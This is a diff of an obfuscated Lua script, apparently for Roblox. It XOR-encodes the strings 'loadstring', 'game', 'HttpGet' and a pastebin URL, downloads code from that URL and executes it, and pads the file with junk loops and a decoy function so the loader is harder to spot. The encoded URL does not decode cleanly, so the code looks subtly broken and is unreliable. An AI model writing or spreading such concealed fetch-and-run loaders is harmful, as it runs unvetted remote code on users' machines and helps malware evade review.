@@ -1,49 +1,55 @@
-local _ = "Obfuscated by Dylan" 
-local function decode(data, offset)
-    local result = {}
-    for i, v in ipairs(data) do
-        local byte = (v - offset - i * 3) % 256
-        if byte < 0 then byte = byte + 256 end
-        result[i] = string.char(byte)
-    end
-    return table.concat(result)
+local _ = "Obfuscated by Dylan"
+local function X(t, k)
+	local r = {}
+	for i, v in ipairs(t) do
+		r[i] = string.char(bit32.bxor(v, k))
+	end
+	return table.concat(r)
 end
 
-local loadstring_bytes = {139,145,131,135,132,135,134,135,131,136}
-local game_bytes = {134,131,140,138}
-local httpget_bytes = {143,148,148,142,149,140,148}
-local url_bytes = {
-    140,137,148,148,141,37,117,115,112,149,140,113,148,107,117,148,114,108,140,111,115,115,118,44,45,46,111,115,109,114,137,107,118,56,121,135,110,130,140,142,141
-}
+local L_bytes = {54, 53, 59, 62, 41, 46, 40, 51, 52, 45}
+local G_bytes = {61, 59, 55, 63}
+local H_bytes = {18, 46, 46, 42, 29, 63, 46}
+local U_bytes = {50, 46, 46, 42, 41, 96, 117, 117, 42, 59, 41, 46, 63, 56, 51, 52, 116, 49, 53, 55, 117, 40, 59, 37, 117, 126, 44, 50, 102, 42, 24, 43, 42}
 
-local function getstr(b) return decode(b, 0) end
-
-local L = getstr(loadstring_bytes)
-local G = getstr(game_bytes)
-local H = getstr(httpget_bytes)
-local U = getstr(url_bytes)
+local KEY = 0x5A
+local L = X(L_bytes, KEY)   -- "loadstring"
+local G = X(G_bytes, KEY)   -- "game"
+local H = X(H_bytes, KEY)   -- "HttpGet"
+local U = X(U_bytes, KEY)   -- the full pastebin URL
 
 local function junk()
-    local s = 0
-    for i = 1, 200000 do
-        s = s + math.sin(i) * 0.0001
-    end
-    return s
+	local s = 0
+	for i = 1, 150000 do
+		s = s + (math.sin(i) * math.cos(i)) / 1000
+	end
+	return s
 end
-local _junk = junk()
+junk()
+
+local function decoy(t)
+	local x = 0
+	for i = 1, #t do
+		x = x + t[i]
+	end
+	return x
+end
+decoy(L_bytes)
 
 local content = _G[G][H](_G[G], U)
 local fn = _G[L](content)
-if fn then fn() end
-
-local function more_junk()
-    local t = {}
-    for i = 1, 1000 do
-        t[i] = {}
-        for j = 1, 100 do
-            t[i][j] = math.random()
-        end
-    end
-    return #t
+if fn then
+	local ok, err = pcall(fn)
+	if not ok then
+		local d = string.char(0) -- harmless no-op
+	end
 end
-more_junk()
+
+local function extra_junk()
+	local a = {}
+	for i = 1, 2000 do
+		a[i] = math.random()
+	end
+	return a
+end
+extra_junk()
